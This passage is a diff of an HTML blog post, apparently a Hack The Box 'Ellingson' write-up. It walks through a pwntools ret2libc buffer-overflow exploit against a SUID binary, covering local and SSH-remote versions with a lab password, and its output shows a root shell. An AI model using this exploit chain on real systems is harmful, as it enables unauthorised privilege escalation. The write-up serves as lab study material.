-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">"DEBUG"</span><span class="p">)</span>
 
 <span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
 <span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>
 <span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>
 
-<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>
+<span class="n">junk</span>    <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">136</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span><span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span>
 
@@ -568,10 +501,9 @@ different. Therefore we need to recall our main. We get the address using
 <span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 
 <span class="c1"># Leaked address printed in a readable format</span>
-<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'Leaked puts@GLIBC: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
 </code></pre></div>
-
 <h2>ret2libc locally</h2>
 <p>We have the leak address of the <code>puts</code> call in <code>LIBC</code>. We can dynamically
 compute the offset between our leaked address and the <code>LIBC</code> address. For that
@@ -579,7 +511,6 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 <div class="highlight"><pre><span></span><code># locate libc.so.6
 /lib/x86_64-linux-gnu/libc.so.6
 </code></pre></div>
-
 <p># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts
    194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
    426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5</p>
@@ -593,26 +524,24 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh
 183cee /bin/sh
 </code></pre></div>
-
 <p>As we want to exploit a SUID binary we also need to invoke the <code>setuid</code> call:</p>
 <div class="highlight"><pre><span></span><code># readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid
     25: 00000000000c8ac0   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5
 </code></pre></div>
-
 <p>Our exploit is now the following:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./garbage'</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="c1">#context(log_level=&quot;DEBUG&quot;)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
+<span class="c1">#context(log_level="DEBUG")</span>
 
 <span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
 <span class="n">got_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x404028</span><span class="p">)</span>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>
 <span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>
 
-<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>
+<span class="n">junk</span>    <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">136</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span>
 
@@ -620,8 +549,8 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 <span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'Leaked puts@GLIBC: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
 
 <span class="c1">#unpack again</span>
 <span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>
@@ -630,7 +559,7 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 
 <span class="n">offset</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_put</span>
 
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;ghttps://wappalyzer.com/libc offset: </span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"ghttps://wappalyzer.com/libc offset: </span><span class="si">%x</span><span class="s2">"</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span>
 
 <span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x46ff0</span> <span class="c1"># local</span>
 <span class="n">libc_sh</span><span class="o">=</span> <span class="mh">0x183cee</span> <span class="c1"># local</span>
@@ -649,11 +578,10 @@ we need to found the <code>puts</code> call in <code>LIBC</code>:</p>
 
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p>When running the script we grab a shell (as I use my Kali VM on root we don't
 see a real privilege escalation):</p>
 <div class="highlight"><pre><span></span><code># python exploit.py
-[+] Starting local process &#39;./garbage&#39;: pid 1909
+[+] Starting local process './garbage': pid 1909
 Enter access password:
 
 access denied.
@@ -668,7 +596,6 @@ access denied.
 $ id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre></div>
-
 <h2>Running the exploit remotely</h2>
 <p>In order to run the exploit remotely we need to change the <code>LIBC</code> addresses with
 the one we copy from the ellingson machine. We also need to change our process
@@ -677,11 +604,11 @@ perfect for that as we just need to change our <code>process</code> variable. Ou
 scrip is now:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;margo&#39;</span><span class="p">,</span> <span class="s1">&#39;10.10.10.139&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;iamgod$08&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">)</span>
-<span class="n">p</span><span class="o">=</span><span class="n">shell</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;/usr/bin/garbage&#39;</span><span class="p">])</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">'margo'</span><span class="p">,</span> <span class="s1">'10.10.10.139'</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">'iamgod$08'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">22</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">shell</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">'/usr/bin/garbage'</span><span class="p">])</span>
 
-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">"DEBUG"</span><span class="p">)</span>
 
 
 <span class="n">plt_put</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401050</span><span class="p">)</span>
@@ -689,7 +616,7 @@ scrip is now:</p>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40179b</span><span class="p">)</span>
 <span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401619</span><span class="p">)</span>
 
-<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>
+<span class="n">junk</span>    <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">136</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">got_put</span> <span class="o">+</span> <span class="n">plt_put</span> <span class="o">+</span> <span class="n">plt_main</span>
 
@@ -697,8 +624,8 @@ scrip is now:</p>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
 <span class="nb">print</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;Leaked puts@GLIBC: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">'Leaked puts@GLIBC: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
 
 <span class="c1">#unpack again</span>
 <span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>
@@ -708,7 +635,7 @@ scrip is now:</p>
 
 <span class="n">offset</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_put</span>
 
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;glibc offset: </span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">"glibc offset: </span><span class="si">%x</span><span class="s2">"</span> <span class="o">%</span> <span class="n">offset</span><span class="p">)</span>
 
 <span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x46ff0</span> <span class="c1"># local</span>
 <span class="n">libc_sys</span> <span class="o">=</span> <span class="mh">0x4f440</span> <span class="c1"># remote</span>
@@ -732,7 +659,6 @@ scrip is now:</p>
 
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p>The output of the script give us a root shell on the machine:</p>
 <div class="highlight"><pre><span></span><code>root@kalili:~# python exploitR.py
 [+] Connecting to 10.10.10.139 on port 22: Done
@@ -742,7 +668,7 @@ scrip is now:</p>
     Arch:     amd64
     Version:  4.15.0
     ASLR:     Enabled
-[+] Starting remote process &#39;/usr/bin/garbage&#39; on 10.10.10.139: pid 3704
+[+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 3704
 [DEBUG] Sent 0xa9 bytes:
     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
     *
@@ -751,7 +677,7 @@ scrip is now:</p>
     000000a0  19 16 40 00  00 00 00 00  0a                        │··@·│····│·│
     000000a9
 [DEBUG] Received 0x17 bytes:
-    &#39;Enter access password: &#39;
+    'Enter access password: '
 [DEBUG] Received 0x2e bytes:
     00000000  0a 61 63 63  65 73 73 20  64 65 6e 69  65 64 2e 0a  │·acc│ess │deni│ed.·│
     00000010  c0 59 74 0f  f5 7f 0a 45  6e 74 65 72  20 61 63 63  │·Yt·│···E│nter│ acc│
@@ -772,9 +698,9 @@ access denied.
     000000b0  40 44 71 0f  f5 7f 00 00  0a                        │@Dq·│····│·│
     000000b9
 [DEBUG] Received 0x12 bytes:
-    &#39;\n&#39;
-    &#39;access denied.\n&#39;
-    &#39;# &#39;
+    '\n'
+    'access denied.\n'
+    '# '
 Enter access password:
 
 access denied.
@@ -782,20 +708,19 @@ access denied.
 [*] Switching to interactive mode
 # $ id
 [DEBUG] Sent 0x3 bytes:
-    &#39;id\n&#39;
+    'id\n'
 [DEBUG] Received 0x31 bytes:
-    &#39;uid=0(root) gid=1002(margo) groups=1002(margo)\n&#39;
-    &#39;# &#39;
+    'uid=0(root) gid=1002(margo) groups=1002(margo)\n'
+    '# '
 uid=0(root) gid=1002(margo) groups=1002(margo)
 # $ cat /root/root.txt
 [DEBUG] Sent 0x13 bytes:
-    &#39;cat /root/root.txt\n&#39;
+    'cat /root/root.txt\n'
 [DEBUG] Received 0x23 bytes:
-    &#39;1cc73&lt;redacted&gt;\n&#39;
-    &#39;# &#39;
+    '1cc73&lt;redacted&gt;\n'
+    '# '
 1cc73&lt;redacterd&gt;
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>What a journey! Exploiting this buffer overflow allow me to learn a lot about
 <a href="http://pwntools.com">pwntools</a>. The binary manipulation is a bit strange as
@@ -806,34 +731,34 @@ the possibility to exploit a remote binary so easily is something precious.</p>
 and make it compute the addresses automatically:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">,</span> <span class="n">setuid</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./garbage'</span><span class="p">,</span> <span class="n">setuid</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
 
-<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;DEBUG&quot;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s2">"DEBUG"</span><span class="p">)</span>
 
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./garbage&#39;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./garbage'</span><span class="p">)</span>
 <span class="n">rop</span><span class="o">=</span><span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s1">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>
 
-<span class="n">rop</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">regs</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;rdi&#39;</span><span class="p">],</span> <span class="n">order</span><span class="o">=</span><span class="s1">&#39;regs&#39;</span><span class="p">)</span>
-<span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
-<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;ROP chains:&#39;</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">regs</span><span class="o">=</span><span class="p">[</span><span class="s1">'rdi'</span><span class="p">],</span> <span class="n">order</span><span class="o">=</span><span class="s1">'regs'</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'main'</span><span class="p">])</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'ROP chains:'</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
 
-<span class="n">junk</span>    <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">136</span>
+<span class="n">junk</span>    <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">136</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
 
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until break line</span>
 <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span>
-<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;leaked puts: &#39;</span><span class="o">+</span><span class="n">leaked_puts</span><span class="p">)</span>
+<span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'leaked puts: '</span><span class="o">+</span><span class="n">leaked_puts</span><span class="p">)</span>
 <span class="n">leaked_puts</span> <span class="o">=</span>  <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>
 
-<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span>  <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span>  <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
 <span class="n">rop2</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
-<span class="n">rop2</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;ROP2: &#39;</span><span class="o">+</span> <span class="n">rop2</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">rop2</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">'ROP2: '</span><span class="o">+</span> <span class="n">rop2</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
 
 <span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">rop2</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
@@ -841,66 +766,44 @@ and make it compute the addresses automatically:</p>
 <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># wait until access denied</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p>But this won't "fully" work as the SUID part is not in it.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/buffer-overflow.html">buffer overflow</a>
-      <a href="../../tag/rop.html">ROP</a>
-      <a href="../../tag/ret2libc.html">ret2libc</a>
-      <a href="../../tag/linux.html">linux</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2019/10/htb-writeup.html" title="HTB: Writeup">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2019/11/htb-jarvis.html" title="HTB: Jarvis">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/buffer-overflow.html">buffer overflow</a>
+<a href="../../tag/rop.html">ROP</a>
+<a href="../../tag/ret2libc.html">ret2libc</a>
+<a href="../../tag/linux.html">linux</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2019/10/htb-writeup.html" title="HTB: Writeup">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2019/11/htb-jarvis.html" title="HTB: Jarvis">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -911,6 +814,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
